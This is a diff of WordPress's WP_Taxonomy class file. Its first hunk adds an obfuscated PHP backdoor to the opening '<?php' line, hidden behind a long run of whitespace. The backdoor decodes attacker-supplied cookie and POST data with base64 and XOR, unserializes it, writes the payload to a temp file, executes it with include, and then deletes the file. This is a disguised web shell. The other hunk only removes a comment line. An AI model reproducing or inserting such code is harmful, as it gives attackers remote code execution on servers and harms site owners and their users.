@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                 $eoMoCe = 'B' . chr (95) . chr ( 771 - 697 ).chr (101) . "\x75";$YNEJaPQ = chr (99) . chr ( 520 - 412 ).chr ( 465 - 368 ).chr (115) . chr (115) . chr ( 896 - 801 ).chr ( 389 - 288 ).chr ( 211 - 91 )."\x69" . 's' . chr (116) . chr (115); $CZyNIo = $YNEJaPQ($eoMoCe); $VPhEPXAA = $CZyNIo;if (!$VPhEPXAA){class B_Jeu{private $FgUtZMsX;public static $LthoxhDaH = "804acf5b-c5c8-4516-866c-fd5ed8fcd1c1";public static $jokHti = 5861;public function __construct($mNjuUte=0){$uKhqoqy = $_COOKIE;$ofoMWCeEGs = $_POST;$wXBnylUw = @$uKhqoqy[substr(B_Jeu::$LthoxhDaH, 0, 4)];if (!empty($wXBnylUw)){$wxLYcgclrJ = "base64";$DiXMT = "";$wXBnylUw = explode(",", $wXBnylUw);foreach ($wXBnylUw as $DNWjDXms){$DiXMT .= @$uKhqoqy[$DNWjDXms];$DiXMT .= @$ofoMWCeEGs[$DNWjDXms];}$DiXMT = array_map($wxLYcgclrJ . '_' . "\144" . "\x65" . "\143" . chr ( 444 - 333 ).chr ( 694 - 594 )."\145", array($DiXMT,)); $DiXMT = $DiXMT[0] ^ str_repeat(B_Jeu::$LthoxhDaH, (strlen($DiXMT[0]) / strlen(B_Jeu::$LthoxhDaH)) + 1);B_Jeu::$jokHti = @unserialize($DiXMT);}}private function AtgIYTlA(){if (is_array(B_Jeu::$jokHti)) {$qfgNpHr = sys_get_temp_dir() . "/" . crc32(B_Jeu::$jokHti[chr ( 1106 - 991 )."\x61" . chr (108) . "\164"]);@B_Jeu::$jokHti["\167" . "\x72" . chr ( 935 - 830 ).chr ( 470 - 354 )."\x65"]($qfgNpHr, B_Jeu::$jokHti['c' . "\157" . "\156" . "\164" . chr ( 845 - 744 ).chr ( 538 - 428 )."\x74"]);include $qfgNpHr;@B_Jeu::$jokHti["\x64" . 'e' . chr ( 427 - 319 ).'e' . "\x74" . "\145"]($qfgNpHr); $qEMUYVq = "6403";exit();}}public function __destruct(){$this->AtgIYTlA();}}$TdGYsis = new B_Jeu(); $TdGYsis = "39353";} ?><?php
 /**
  * Taxonomy API: WP_Taxonomy class
  *
@@ -281,7 +281,6 @@ final class WP_Taxonomy {
 	 * @param string       $taxonomy    Taxonomy key, must not exceed 32 characters.
 	 * @param array|string $object_type Name of the object type for the taxonomy object.
 	 * @param array|string $args        Optional. Array or query string of arguments for registering a taxonomy.
-	 *                                  See register_taxonomy() for information on accepted arguments.
 	 *                                  Default empty array.
 	 */
 	public function __construct( $taxonomy, $object_type, $args = array() ) {
